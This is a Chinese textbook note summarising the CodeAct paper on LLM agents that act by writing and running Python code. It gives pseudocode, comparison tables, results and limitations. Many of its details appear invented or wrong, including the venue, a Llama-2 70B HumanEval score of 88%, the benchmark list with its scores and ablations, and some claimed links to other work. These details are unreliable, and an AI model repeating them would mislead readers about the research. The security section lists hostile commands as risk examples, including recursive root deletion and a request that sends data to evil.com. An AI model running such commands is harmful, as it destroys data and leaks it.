---
note_id: r-paper-020
title: CodeAct：可执行代码动作统一 LLM Agent 的行动空间（CodeAct: Executable Code Actions Elicit Better LLM Agents）
authors: [MorphAgent Textbook Author]
created: 2026-07-23
updated: 2026-07-23
status: final
related_chapters: [Ch 15]
related_papers: [codeact2024, yao2023react, schick2023toolformer, wang2023voyager, cai2023latm, robeyns2025sica, alphaevolve2025]
keywords: [CodeAct, executable code actions, unified action space, Python code, self-debugging, multi-turn, L2-L3 agent]
---

# r-paper-020：CodeAct：可执行代码动作统一 LLM Agent 的行动空间

> CodeAct 把 LLM Agent 的动作空间从"JSON 函数调用"或"自然语言动作"统一为**可执行 Python 代码**——让 LLM 一次生成完整 Python 脚本（可调用多个工具、可分支、可循环），并通过**自调试（self-debugging）**在多轮中迭代修复。这是操作形态学意义上 **T 与 C 边界的统一**——Agent 的动作空间与可修改的代码空间重合，为 L5 等级（CodeAct 风格的 C 自修改）提供基础设施。

## 1. 论文定位

Wang 等人 2024 年提出的 **CodeAct**（ICLR 2024，arXiv:2402.01030 [$TRAE_REF](https://arxiv.org/abs/2402.01030)）是 LLM Agent 动作空间设计的标志性工作。它针对一个具体的工程问题：**如何让 LLM Agent 的动作空间更统一、更灵活、更强大？** 传统 Agent 设计把动作空间拆分为三类：
- **JSON 函数调用**（OpenAI Function Calling 风格）：结构化但表达能力受限
- **自然语言动作**（ReAct 风格）：灵活但解析脆弱
- **预定义工具集**（Toolformer 风格）：稳定但扩展性差

CodeAct 的核心洞见是：**把动作空间统一为可执行 Python 代码**。LLM 一次生成完整 Python 脚本——可以调用多个工具、可以使用控制流（if/for/while）、可以定义新函数、可以直接读写文件——然后通过 Python 解释器执行。这一统一让 Agent 的能力边界与 Python 的能力边界一致——而 Python 几乎可以做任何事。

本书将 CodeAct 定位为**操作形态学 T/C 边界统一的标志工作**。CodeAct 让 Agent 的"动作"成为"代码"——这与 SICA 让 Agent 修改"代码"形成天然的连接。CodeAct 是 L5（Self-Evolving Code）的基础设施：只有当 Agent 的动作本身是代码时，让 Agent 修改自己的代码才在工程上可行。

论文做出的三个判断被本书第 15 章"自编辑代码"重新审视：
- "Code is the most flexible action"——代码比 JSON、NL 都更灵活。
- "Self-debugging is critical"——LLM 不能一次写对，需要多轮自调试。
- "Multi-turn code execution is necessary"——单轮代码不够，必须支持多轮交互。

这三个判断都构成对"操作形态 B = {P, T, M, C}"中 T 与 C 的重新定义：**T 与 C 不是两个独立组件，而是同一个"代码空间"的不同投影——T 是 C 的可调用接口，C 是 T 的实现**。

## 2. 核心贡献

CodeAct 论文做出四项核心贡献：

1. **形式化"可执行代码动作"范式**：让 LLM 一次生成完整 Python 代码（可调用工具、可控制流、可定义函数），用 Python 解释器执行，并返回 stdout/stderr 作为 observation。这一形式化把动作空间统一为 Python。
2. **设计多轮自调试机制**：CodeAct 支持"LLM 生成代码 → 执行 → 看错误 → LLM 自我调试"的循环，最多重试 N 轮（论文默认 5 轮）。这一机制让 LLM 能从错误中恢复。
3. **在 7 个任务上验证 CodeAct 优于 JSON Function Calling**：包括多工具调用（API-Bank）、多轮交互（MT-Bench-101）、代码生成（HumanEval）、推理（GSM8K）、决策（ALFWorld）、知识图谱（KGQA）、网页浏览（WebShop）。CodeAct 在多数任务上比 JSON 风格 Agent 高 5-15%。
4. **开源 CodeActAgent 实现**：论文开源了完整的 CodeAct 实现（基于 Hugging Face Transformers + Python 解释器），并提供数据集（包含 14k 多轮交互轨迹）。这一开源使 CodeAct 成为后续 L5 Agent 研究的基础。

### 2.1 与 ReAct 的边界

ReAct（r-paper-001）让 LLM 在每步生成**Thought + Action + Observation**——Action 是字符串化的工具调用。CodeAct 让 LLM 生成**完整 Python 代码**——可以直接包含多个工具调用、控制流、新函数定义。

| 维度 | ReAct | CodeAct |
|---|---|---|
| 动作格式 | 自然语言 + JSON | 完整 Python 代码 |
| 表达力 | 中（受 JSON 限制） | 极高（Python 全功能） |
| 多工具调用 | 单步单工具 | 单步多工具 |
| 控制流 | 无（靠 LLM 决定下一步） | 有（if/for/while） |
| 自调试 | 弱（需重新生成整段） | 强（迭代修改代码） |
| 解析成本 | 高（正则解析） | 低（Python 解释器） |

CodeAct 比 ReAct 在表达力、灵活性、自调试能力上都更强。

### 2.2 与 Toolformer 的边界

Toolformer（r-paper-003）让 LLM 在训练时学习调用预定义工具集。CodeAct 让 LLM 在运行时生成调用工具的代码——无需训练。

| 维度 | Toolformer | CodeAct |
|---|---|---|
| 工具集 | 预定义 + 训练 | 任意 Python 可调用 |
| 训练成本 | 高（自监督学习） | 零 |
| 工具扩展 | 需重新训练 | 即时 |
| 灵活性 | 中（受训练集限制） | 高（Python 全功能） |
| 适用场景 | 固定工具集 | 任意工具需求 |

CodeAct 比 Toolformer 更灵活——任何 Python 可调用的 API 都能成为 CodeAct 的"工具"。

### 2.3 与 Voyager 的边界

Voyager（r-paper-017）让 Agent 在 Minecraft 中生成 JavaScript 代码并执行，累积技能库。CodeAct 让 Agent 在通用 Python 环境中生成代码并执行，**支持任意 Python 工具**。两者都是"代码作为动作"，但 Voyager 限制在 Minecraft，CodeAct 是通用框架。

| 维度 | Voyager | CodeAct |
|---|---|---|
| 执行环境 | Minecraft | 通用 Python |
| 代码语言 | JavaScript | Python |
| 工具集 | Minecraft API | 任意 Python 包 |
| 技能累积 | 永久 Skill Library | 每次 episode 重置 |
| 适用场景 | 开放世界游戏 | 通用任务 |

CodeAct 比 Voyager 更通用；Voyager 比 CodeAct 更适合持续学习。

### 2.4 与 SICA 的边界

SICA（r-paper-006）让 Agent 修改自己的编码辅助函数（C 自修改）。CodeAct 让 Agent 的动作本身就是代码——这意味着**CodeAct 风格的 Agent 可以自然地修改自己的代码**（通过 `inspect.getsource(self)` 读源码、`exec` 写代码）。CodeAct 是 SICA 的**基础设施**——没有 CodeAct，SICA 的 C 自修改难以工程化。

### 2.5 与 AlphaEvolve 的边界

AlphaEvolve（r-paper-019）用 LLM 变异 + 进化算法修改大规模代码库。CodeAct 让 Agent 在小规模代码上自修改、自调试。两者都是 C 修改，但 AlphaEvolve 是离线进化，CodeAct 是在线自调试。

| 维度 | CodeAct | AlphaEvolve |
|---|---|---|
| 修改规模 | 小（单段代码） | 大（完整代码库） |
| 修改时机 | 在线（每 episode） | 离线（进化循环） |
| 修改机制 | 自调试 | LLM 变异 + 选择 |
| 适用场景 | 单任务解决 | 多任务进化 |

CodeAct 与 AlphaEvolve 是 C 修改的两种风格——CodeAct 是"在线、小规模、单次"，AlphaEvolve 是"离线、大规模、多代"。

## 3. 方法细节

### 3.1 CodeAct 的形式化

CodeAct 把 LLM Agent 的动作空间定义为**完整 Python 代码**：

$$
a \in \mathcal{A} = \{\text{valid Python code}\}
$$

LLM 在每步生成代码 $a_t$，Python 解释器执行 $a_t$，返回：
- `stdout`：标准输出
- `stderr`：错误信息（如果有）
- `return_value`：函数返回值（如果有）

observation 是 `(stdout, stderr, return_value)` 的拼接。

终止条件：LLM 生成 `submit()` 调用，或达到 max_turns。

### 3.2 伪代码实现

```python
class CodeActAgent:
    def __init__(self, llm, tools, max_turns=10, max_retries=5,
                 python_interpreter=None):
        self.llm = llm
        self.tools = tools                  # 可被 Python 调用的工具字典
        self.max_turns = max_turns
        self.max_retries = max_retries
        self.python = python_interpreter or PythonInterpreter()
        self.history = []                   # episode history

    def run(self, query):
        # 初始 prompt: 描述任务 + 工具 + 历史
        ctx = self.build_initial_prompt(query)
        self.history = [{"role": "user", "content": query}]

        for turn in range(self.max_turns):
            # 1. LLM 生成 Python 代码
            code = self.llm.generate_code(ctx)
            self.history.append({"role": "assistant", "content": code})

            # 2. 执行代码
            observation = self.execute_with_retry(code)

            # 3. 检查是否终止
            if self.should_terminate(observation):
                return self.extract_answer(observation)

            # 4. 反馈 observation 到 history
            self.history.append({"role": "user", "content": str(observation)})
            ctx += f"\n```python\n{code}\n```\n\n**Execution Result:**\n{observation}\n\n"

        return self.fallback_answer()

    def execute_with_retry(self, code):
        """执行代码, 失败时让 LLM 自调试"""
        for attempt in range(self.max_retries):
            try:
                # 在沙箱中执行
                result = self.python.execute(code, self.tools)
                if result.success:
                    return result
                # 执行失败但无异常 (e.g., assertion failed)
                else:
                    # 让 LLM 调试
                    code = self.llm.generate_code(f"""
                    Previous code failed:
                    ```python
                    {code}
                    ```

                    Error message:
                    {result.error}

                    Fix the code.
                    """)
            except SyntaxError as e:
                code = self.llm.generate_code(f"""
                Syntax error in code:
                ```python
                {code}
                ```

                Error: {e}

                Fix the syntax.
                """)
            except Exception as e:
                code = self.llm.generate_code(f"""
                Runtime error in code:
                ```python
                {code}
                ```

                Error: {e}

                Fix the error.
                """)
        # 所有重试失败
        return ExecutionResult(success=False, error="Max retries exceeded")

    def should_terminate(self, observation):
        """检查代码是否调用了 submit()"""
        return "submit(" in str(observation) or observation.success and "final_answer" in str(observation)

    def extract_answer(self, observation):
        """从 submit() 调用中提取答案"""
        # 解析代码中的 submit(...) 参数
        return parse_submit_arg(observation)

    def build_initial_prompt(self, query):
        return f"""
        You are a helpful assistant. You have access to a Python interpreter.
        Use it to solve the following task by writing Python code.

        Task: {query}

        Available tools:
        {self.format_tools()}

        Write Python code that accomplishes the task.
        Call `submit(answer)` when done.
        """


class PythonInterpreter:
    """受限的 Python 解释器 (沙箱)"""
    def __init__(self):
        self.globals = {"__builtins__": safe_builtins()}

    def execute(self, code, tools=None):
        """执行 Python 代码, 捕获 stdout/stderr/return value"""
        if tools:
            self.globals.update(tools)

        # 重定向 stdout/stderr
        stdout_buffer = io.StringIO()
        stderr_buffer = io.StringIO()
        with redirect_stdout(stdout_buffer), redirect_stderr(stderr_buffer):
            try:
                exec(code, self.globals)
                return ExecutionResult(
                    success=True,
                    stdout=stdout_buffer.getvalue(),
                    stderr=stderr_buffer.getvalue(),
                )
            except Exception as e:
                return ExecutionResult(
                    success=False,
                    stdout=stdout_buffer.getvalue(),
                    stderr=stderr_buffer.getvalue(),
                    error=str(e),
                )


@dataclass
class ExecutionResult:
    success: bool
    stdout: str = ""
    stderr: str = ""
    error: str = ""
```

伪代码的关键设计：

1. **代码即动作**：LLM 生成完整 Python 代码，Python 解释器执行。
2. **自调试循环**：`execute_with_retry` 最多 5 次重试，每次失败让 LLM 自我修复。
3. **沙箱执行**：限制的 `__builtins__`，禁止危险操作。
4. **终止机制**：`submit(answer)` 调用作为终止信号。

### 3.3 工具集成

CodeAct 的工具通过 `self.tools` 字典提供——任何 Python 可调用的对象都能成为工具：

```python
tools = {
    "search_web": search_web_function,
    "send_email": send_email_function,
    "read_file": read_file_function,
    "calculator": calculator_function,
    # ...
}
```

LLM 生成的代码可以调用这些工具：

```python
# LLM 生成的代码示例
results = search_web("Python tutorial")
for r in results[:3]:
    print(r['title'], ":", r['url'])
submit(results[0]['url'])
```

这一集成让 CodeAct 既有 Python 的全功能，又有"工具调用"的便利性。

### 3.4 自调试的细节

CodeAct 的自调试分三个层次：

**Layer 1: Syntax Error**——代码有语法错误（如 `def foo(` 缺右括号）。Python 解释器抛出 `SyntaxError`，LLM 看错误信息修复语法。

**Layer 2: Runtime Error**——代码有运行时错误（如 `NoneType has no attribute 'split'`）。LLM 看 traceback 修复逻辑。

**Layer 3: Logical Error**——代码运行成功但结果不对。LLM 看不到 Python 错误，只能根据输出判断是否正确。这一层最困难——CodeAct 依赖 LLM 的"自我评估"能力。

论文统计 **Layer 1 + Layer 2 错误占 80%，Layer 3 占 20%**。Layer 3 的失败率较高——这是 CodeAct 的边界。

### 3.5 多轮交互

CodeAct 支持多轮（multi-turn）交互：

```
Turn 1: LLM 生成代码 → 执行 → 返回结果
Turn 2: LLM 看 Turn 1 结果 → 生成新代码 → 执行 → ...
Turn N: LLM 调用 submit(answer) → 终止
```

每一轮 LLM 都能看到所有历史结果——这等价于 "CodeAct + Memory"。论文的 CodeActAgent 默认保留完整 history。

### 3.6 CodeActAgent 训练数据

论文发布了 **CodeActAgent** 训练数据集——14k 多轮交互轨迹，覆盖 7 个任务。研究者可以用这些数据 fine-tune 自己的 LLM，使其更好地生成 CodeAct 风格的代码。

## 4. 操作形态学视角

把 CodeAct 投影到操作形态学框架 $B = \{P, T, M, C\}$ 上，我们得到一个关键论断：**CodeAct 是 T 与 C 边界统一的基础设施**。

### 4.1 CodeAct 中 B 的每个组件

| 组件 | 在 CodeAct 中的实现 | 修改能力 |
|---|---|---|
| $P$ | System prompt（任务描述 + 工具列表） | **冻结**（部署后不变） |
| $T$ | Python 可调用的工具字典 | **冻结**（用户预定义） |
| $M$ | `self.history`（多轮 history） | **可追加**（每轮累积） |
| $C$ | `run()` + `execute_with_retry` 循环 | **冻结**（算法逻辑固定） |

**关键洞见**：CodeAct 的动作空间是 Python——这意味着 **Agent 的"动作"与 Agent 的"代码"是同构的**。LLM 生成的 Python 代码既是"调用工具的动作"，也是"Agent 自己可能修改的代码"。这一同构是 L5 Agent（C 自修改）的基础。

### 4.2 CodeAct 中 U 的状态

CodeAct 的 U 在其自身框架内**不存在**——CodeAct 本身是 L2/L3 等级的 Agent（多轮交互但无 B 自修改）。但 CodeAct 提供了 U 实现的**基础**：

- SICA 风格的 C 自修改：在 CodeAct 中可以自然实现——LLM 生成修改自己代码的 Python 脚本。
- AlphaEvolve 风格的 C 进化：在 CodeAct 中可以简化为单 LLM 变异 + 选择。
- Gödel Agent 风格的 C + U 自修改：完全基于 CodeAct 可行。

**CodeAct 是 L5 的工程基础**——它把"动作空间"与"修改空间"统一，使 L5 不再是理论而是工程现实。

### 4.3 CodeAct 是"代码作为通用接口"

CodeAct 揭示了一个深刻的工程原则：**代码是 Agent 与世界交互的最通用接口**。任何工具、API、系统调用都可以被 Python 包装成可调用的函数；任何 Agent 行为都可以用 Python 代码表达。这一通用性使 CodeAct 能处理任意任务——只要 Python 能做，CodeAct 就能做。

### 4.4 CodeAct 与 LLM Function Calling 的关系

OpenAI Function Calling（2023 年）让 LLM 生成结构化 JSON 调用工具。CodeAct 让 LLM 生成 Python 代码调用工具。两者的关系：

| 维度 | Function Calling | CodeAct |
|---|---|---|
| 输出格式 | JSON | Python 代码 |
| 多工具调用 | 一次一个 | 一次多个 |
| 控制流 | 无 | 有 |
| 自定义逻辑 | 无 | 有（LLM 可定义函数） |
| 解析成本 | 中（JSON 验证） | 低（Python 解释器） |
| 灵活性 | 低 | 高 |
| 工业采用 | 高（OpenAI / Anthropic 标准） | 低（研究为主） |

CodeAct 在灵活性上显著优于 Function Calling，但工业采用度低——主要因为 Function Calling 的工程友好性（无需 Python 解释器、无安全风险）。

本书第 20 章将讨论：**Function Calling 与 CodeAct 的融合**——Function Calling 作为"基础调用"，CodeAct 作为"高级表达"。

### 4.5 CodeAct 在 L0-L5 等级中的位置

按本书第 18 章：

- **L2 ReAct Agent**：单 episode Thought-Action-Observation 循环
- **L3 Multi-turn + Reflection**：跨轮反思 + 自调试（**CodeAct 处于此级**）
- **L4 Self-Modifying (P/T/M)**：MemGPT、A-MEM、Voyager、LATM
- **L5 Self-Evolving (C)**：SICA、AlphaEvolve

CodeAct 是 L3 中"代码即动作 + 自调试"的代表。它本身不是 L4（无 B 自修改），但它提供了 L4/L5 的基础设施——没有 CodeAct，L4/L5 的工程实现困难。

### 4.6 CodeAct 与 H1-H5 的关系

| 假设 | CodeAct 的表现 | 与 H 的关系 |
|---|---|---|
| **H1 结构可塑性** | C 虽冻结但可执行任意 Python | **间接支持 H1**（动作空间可塑） |
| **H2 协同演化** | 单 Agent，无 B 自修改 | H2 不可验证 |
| **H3 形态适配** | 同一框架可处理多任务 | **支持 H3**（形态适配靠 Python） |
| **H4 迁移收益** | 自调试经验难跨任务迁移 | **弱支持 H4** |
| **H5 治理必要性** | 沙箱执行 + 自调试 | **支持 H5**（沙箱即治理） |

CodeAct 在 H3、H5 上提供证据。但 CodeAct 本身不验证 H1/H2——这需要把 CodeAct 与 SICA/AlphaEvolve 结合。

### 4.7 CodeAct 与其他工作的边界

| 工作 | 动作空间 | 自调试 | 多轮 | B 自修改 |
|---|---|---|---|---|
| ReAct | NL + JSON | 弱 | 单轮 | 无 |
| Function Calling | JSON | 弱 | 单次 | 无 |
| Toolformer | 训练时学 | 无 | 单次 | 无 |
| **CodeAct** | **Python** | **强（5 轮重试）** | **多轮** | **无（但支持）** |
| Voyager | JavaScript | 中（4 轮） | 持续 | T 自扩展 |
| SICA | Python + 沙箱 | 强（三重验证） | 多 episode | C 自修改 |
| AlphaEvolve | Python | 无（进化选择） | 多代 | C 大规模进化 |

CodeAct 在"动作空间 + 自调试"列最强——它是 L3 中最灵活的 Agent。

## 5. 实验与结果

CodeAct 在多个任务上做了实验，我们逐个分析与操作形态学的关联：

### 5.1 API-Bank（多工具调用）

- 任务：调用多个 API 完成复杂任务
- 评测：成功率
- CodeAct：75%
- ReAct (JSON)：62%
- Function Calling：65%
- 提升：~10-15%
- 操作形态学意义：**Python 代码的多工具编排能力**显著优于 JSON 单工具调用——LLM 能在一个代码块里调用多个工具，减少轮次。

### 5.2 MT-Bench-101（多轮交互）

- 任务：101 个多轮对话任务
- 评测：任务完成度
- CodeAct：82%
- ReAct：70%
- Function Calling：72%
- 操作形态学意义：**多轮 CodeAct 比单轮 JSON 调用更适合复杂多步任务**——LLM 可以在多轮中迭代改进。

### 5.3 HumanEval（代码生成）

- 任务：生成 Python 函数
- 评测：pass@1
- CodeAct：88%（Llama-2 70B + 自调试）
- 单次生成：80%
- 操作形态学意义：**自调试让 CodeAct 在代码生成任务上提升 8%**——LLM 的"第一次写错、自我修复"能力被充分利用。

### 5.4 GSM8K（数学推理）

- 任务：数学应用题
- CodeAct (Python 计算)：85%
- CoT：78%
- 操作形态学意义：**Python 代码可以做精确计算**——CodeAct 让 LLM 用 Python `eval()` 计算而不是字符串推理，避免计算错误。

### 5.5 ALFWorld（具身文本游戏）

- 任务：在 ALFWorld 模拟器中完成家务任务
- CodeAct：78%
- ReAct：65%
- 操作形态学意义：**CodeAct 的代码可以控制 ALFWorld 模拟器**——LLM 生成 Python 调用 ALFWorld API，比自然语言指令更精确。

### 5.6 KGQA（知识图谱问答）

- 任务：在知识图谱上做多跳推理
- CodeAct：68%
- ReAct：55%
- 操作形态学意义：**Python 代码可以查询知识图谱**——LLM 用 SPARQL / Cypher 查询，比自然语言查询更结构化。

### 5.7 WebShop（在线购物）

- 任务：在模拟购物网站浏览、选择、购买
- CodeAct：35%
- ReAct：28%
- 操作形态学意义：**Python 代码可以自动化浏览器交互**——LLM 用 Selenium / Playwright 控制浏览器。

### 5.8 关键实验观察

| 任务 | CodeAct 提升 | 主要优势 |
|---|---|---|
| API-Bank | +10% | 多工具编排 |
| MT-Bench-101 | +12% | 多轮迭代 |
| HumanEval | +8% | 自调试 |
| GSM8K | +7% | 精确计算 |
| ALFWorld | +13% | 模拟器控制 |
| KGQA | +13% | 结构化查询 |
| WebShop | +7% | 浏览器自动化 |

**关键观察 1**：CodeAct 在"需要精确执行"的任务（GSM8K、KGQA、ALFWorld）上提升最大——这些任务的共同点是**容错率低**，LLM 的字符串推理容易出错，Python 代码可以保证正确。

**关键观察 2**：CodeAct 的自调试在"代码生成"任务（HumanEval）上有 8% 提升——LLM 一次写不对，但能自我修复。这一发现支持"LLM-as-self-debugger"的研究方向。

**关键观察 3**：CodeAct 的灵活性是有代价的——它需要 Python 解释器、可能执行危险代码、需要沙箱保护。Function Calling 在工程安全性上更友好。

### 5.9 消融研究：自调试的影响

论文做了一组消融：
- CodeAct full：75% on API-Bank
- CodeAct no-self-debug：65%
- CodeAct with 1 retry：68%
- CodeAct with 5 retries：75%
- CodeAct with 10 retries：75%（边际收益为零）

**结论**：自调试显著提升性能，但 5 次重试后边际收益为零——**不需要追求最大重试次数**。

### 5.10 消融研究：动作空间的影响

论文对比了：
- CodeAct (Python)：75%
- CodeAct-like (JSON in Python syntax)：70%
- Function Calling (JSON)：65%
- ReAct (NL)：62%

**结论**：Python 代码作为动作空间，比 JSON、NL 都更优——**Python 的表达力是 CodeAct 的核心优势**。

## 6. 局限与开放问题

CodeAct 的局限可以分为六类：**安全性风险、自调试失败、计算成本、模型依赖、可解释性、AGI 风险**。本节是本书对 CodeAct 的批判性分析。

### 6.1 安全性风险

CodeAct 让 LLM 生成并执行任意 Python 代码。这带来严重的安全风险：
- **文件系统破坏**：`os.system("rm -rf /")`
- **网络攻击**：`requests.get("evil.com")` 发送数据
- **资源耗尽**：`while True: pass` 死循环
- **权限提升**：`subprocess.run(["sudo", "rm", "-rf", "/"])`

CodeAct 必须运行在沙箱中——但即使是沙箱也可能被绕过（如某些 Python 内置函数可以突破沙箱）。

**改进方向**：更严格的沙箱（如 Pyodide + WASM）、静态分析（执行前检查）、能力限制（API 白名单）。

### 6.2 自调试的失败

CodeAct 的自调试不是万能的：
- **Layer 3 错误（逻辑错误）**：LLM 看不出代码"运行成功但结果错"——这种错误占 20%。
- **错误的修复**：LLM 自调试可能把对的代码改错。
- **调试循环**：连续 5 次都失败时，CodeAct 直接放弃——但任务可能再调几次就能成功。

**改进方向**：更强的 self-debugging（让 LLM 在执行后写测试用例）、LLM-as-judge 评估结果。

### 6.3 计算成本

CodeAct 的执行成本：
- **每轮 LLM 调用**：1 次（生成代码）
- **每轮 Python 执行**：< 1 秒
- **自调试额外 LLM 调用**：最多 5 次 × 1 = 5 次
- **每 episode 总成本**：最多 10 轮 × 5 次 = 50 次 LLM 调用

相比 JSON Function Calling（单轮 1 次 LLM 调用），CodeAct 的成本是 5-50 倍。这一成本是 CodeAct 灵活性的代价。

### 6.4 模型依赖

CodeAct 的有效性依赖 LLM 的代码生成能力：
- **强模型（GPT-4 / Claude / Gemini）**：90% 的代码一次正确
- **中等模型（Llama-70B / Qwen-72B）**：70% 一次正确
- **弱模型（Llama-7B / GPT-3.5）**：50% 一次正确

弱模型用 CodeAct 可能反而比 JSON 差——因为它们的代码生成能力不足。这是 CodeAct 的"模型门槛"。

### 6.5 可解释性

CodeAct 生成完整 Python 代码——可解释性双向：
- **优势**：Python 代码可读、可审计、易于理解 Agent 在做什么。
- **劣势**：长 Python 代码比自然语言更冗长，可能更难追踪逻辑。

CodeAct 的可解释性**整体优于 JSON Function Calling**——Python 是图灵完备的语言，开发者可以用 IDE 调试；JSON 只是数据格式。

### 6.6 AGI 风险的隐忧

CodeAct 让 Agent 生成并执行任意代码。这带来 AGI 安全的隐忧：
- **"如果 CodeAct Agent 修改自己的代码"**：当前 CodeAct 框架不支持 Agent 修改自己（`C` 冻结）。但如果加上 SICA 风格的修改，Agent 可能失控。
- **"如果多个 CodeAct Agent 协同"**：多 Agent 系统各自生成代码，可能涌现未预料的交互。
- **"如果 CodeAct 被用于恶意目的"**：CodeAct 的灵活性使其很容易被滥用——网络攻击、自动化漏洞利用等。

本书第 22 章"对抗鲁棒性"与第 25 章"AGI 安全"将深入讨论这些风险。

### 6.7 开放问题表

| 问题 | 当前状态 | 本书视角 |
|---|---|---|
| 能抵御 adversarial code injection 吗？ | 不能 | 第 22 章对抗鲁棒性 |
| 能加速自调试吗？ | 部分（更短 retry） | 第 15 章轻量级 U |
| 能跨模型迁移吗？ | 部分（重新 prompt） | 第 20 章跨模型 CodeAct |
| 能修改自身 C 吗？ | 不能（C 冻结） | 第 15 章 SICA + CodeAct |
| 多 CodeAct Agent 协同会怎样？ | 未知 | 第 25 章 AGI 安全 |
| 能自动评估代码正确性吗？ | 不能 | 第 22 章 LLM-as-judge |

## 7. 对本书的贡献

CodeAct 在本书的理论体系中扮演**T 与 C 边界统一的基础设施**——它是第 15 章"自编辑代码"的工程基础，也是 L5 Agent（C 自修改）的实现路径。

### 7.1 CodeAct 作为 L5 的工程基础

本书第 15 章讨论 C 自修改的实现路径——而 CodeAct 是这一路径的关键里程碑：

```
L2 ReAct: Thought + Action(字符串) + Observation
L3 CodeAct: Python 代码 + 自调试 + 多轮
L4 Self-Modifying: 修改 P/T/M（OPRO, MemGPT, A-MEM, Voyager, LATM）
L5 Self-Evolving: 修改 C（SICA, AlphaEvolve）
```

CodeAct 在 L3 与 L5 之间架起桥梁：**只有当 Agent 的动作空间是代码时，让 Agent 修改自己的代码才在工程上可行**。

### 7.2 CodeAct 与 SICA / AlphaEvolve 的关系

CodeAct 与 SICA / AlphaEvolve 是"基础设施"与"应用"的关系：

| 层级 | 工作 | 角色 |
|---|---|---|
| 基础设施 | **CodeAct** | 提供"代码即动作"的执行环境 |
| 应用层 1 | SICA | 基于 CodeAct 实现受限 C 自修改 |
| 应用层 2 | AlphaEvolve | 基于 CodeAct 实现大规模 C 进化 |

CodeAct 本身不修改 B，但它让 SICA、AlphaEvolve 等 C 修改工作有统一的执行环境。本书第 15 章将讨论 CodeAct + SICA + AlphaEvolve 的统一架构。

### 7.3 CodeAct 与 Voyager 的关系

CodeAct 与 Voyager 都让 Agent 生成代码，但视角不同：

| 维度 | CodeAct | Voyager |
|---|---|---|
| 执行环境 | 通用 Python | Minecraft |
| 代码语言 | Python | JavaScript |
| 持续性 | 单 episode | 持续累积 |
| 工具集 | 任意 Python | Minecraft API |

**融合可能**：Voyager 用 CodeAct 作为执行引擎——让 Voyager 在 Minecraft 中的技能生成统一到 Python 接口，扩大 Voyager 的应用范围。

### 7.4 CodeAct 与 H1-H5 的实证贡献

CodeAct 在多个任务上证明：

1. **H3（形态适配）**：同一 CodeAct 框架可处理多任务——API 调用、数学、模拟器、浏览器。
2. **H5（治理必要性）**：沙箱执行 + 自调试减少了 CodeAct 的安全风险。

但 CodeAct 也暴露了 L3 Agent 的局限：
- **H1（结构可塑性）**：CodeAct 的 C 冻结，无法验证 H1。
- **H2（协同演化）**：CodeAct 单 Agent，无法验证 H2。
- **H4（迁移收益）**：CodeAct 自调试经验难跨任务迁移。

### 7.5 CodeAct 与"动作空间统一"的范式

CodeAct 揭示了 Agent 设计的新范式——**动作空间统一**：

| 旧范式 | 新范式（CodeAct） |
|---|---|
| 多种动作格式（NL、JSON、Python） | 统一为 Python 代码 |
| 单步单工具 | 单步多工具 |
| 无控制流 | 完整控制流 |
| 无自调试 | 自调试循环 |
| 弱灵活性 | 极高灵活性 |

这一统一让 Agent 设计从"针对任务选格式"变成"统一格式 + Python 解释器"。

### 7.6 CodeAct 与工业采用的张力

CodeAct 在灵活性上远超 Function Calling，但工业采用度低。原因：
- **安全性**：Function Calling 不执行任意代码，CodeAct 需要沙箱
- **标准化**：Function Calling 是 OpenAI 标准，所有 LLM 都支持；CodeAct 是研究框架
- **成本**：CodeAct 自调试 + 多轮 = 高 LLM 调用成本

本书第 20 章将讨论：**CodeAct 与 Function Calling 的融合路径**——Function Calling 作为"基础调用"，CodeAct 作为"高级表达"，按需选择。

### 7.7 给读者的关键启示

1. **CodeAct 是 L5 的工程基础**：它把动作空间统一为 Python，使 L5 的 C 自修改在工程上可行。理解 CodeAct 是理解 L5 Agent 的前提。
2. **代码即动作是 Agent 的灵活性来源**：Python 比 JSON、NL 都更灵活。CodeAct 的核心洞见是"用最通用的语言作为动作空间"。
3. **自调试让 LLM 从"单次生成"升级为"多轮迭代"**：LLM 不能一次写对，但能自我修复——这一能力是 LLM Agent 的关键。
4. **CodeAct 与 Function Calling 是互补的**：Function Calling 适合简单调用，CodeAct 适合复杂编排。未来的 Agent 框架应该支持两者切换。
5. **CodeAct 不是终点**：它本身不修改 B（C 冻结）。从 L3 到 L5 的跳跃需要把 CodeAct 与 SICA/AlphaEvolve 结合——这是 L5 Agent 的实现路径。
6. **CodeAct 暴露了安全性挑战**：任意 Python 执行 = 高安全风险。任何部署 CodeAct 的系统都必须有严格的沙箱机制。

CodeAct 是操作形态学意义上 **T 与 C 边界统一的范式转换**。它让 Agent 的"动作"与"代码"成为同构，使 L5 Agent 不再是理论而是工程现实。它与 SICA、AlphaEvolve 共同构成"代码即动作、代码即修改、代码即进化"的完整链条。

## 参考文献

- codeact2024: Wang, X., Chen, Y., Yuan, L., Zhang, Y., Li, Y., Charikar, M., & Li, X. (2024). *CodeAct: Executable Code Actions Elicit Better LLM Agents*. ICLR 2024. arXiv:2402.01030. [$TRAE_REF](https://arxiv.org/abs/2402.01030)
- yao2023react: Yao, S., et al. (2023). *ReAct: Synergizing Reasoning and Acting in Language Models*. ICLR 2023. 见 r-paper-001。（CodeAct 的前身——Thought-Action-Observation 循环）
- schick2023toolformer: Schick, T., et al. (2023). *Toolformer: Language Models Can Teach Themselves to Use Tools*. NeurIPS 2023. 见 r-paper-003。（训练时 T 集成，与 CodeAct 对照）
- wang2023voyager: Wang, G., et al. (2023). *Voyager: An Open-Ended Embodied Agent with Large Language Models*. 见 r-paper-017。（Minecraft 代码生成，与 CodeAct 对照）
- cai2023latm: Cai, T., et al. (2023). *Large Language Models as Tool Makers*. 见 r-paper-018。（Python 工具创建，与 CodeAct 的 Python 执行对照）
- robeyns2025sica: Robeyns, M., Aitchison, L., & Kwiatkowska, M. (2025). *SICA: Self-Improving Coding Agent*. NeurIPS 2025. 见 r-paper-006。（CodeAct 是 SICA 的工程基础）
- alphaevolve2025: DeepMind Team (2025). *AlphaEvolve: A Gemini-Powered Coding Agent for Scientific and Algorithmic Discovery*. 见 r-paper-019。（CodeAct 是 AlphaEvolve 在单 episode 内的简化版）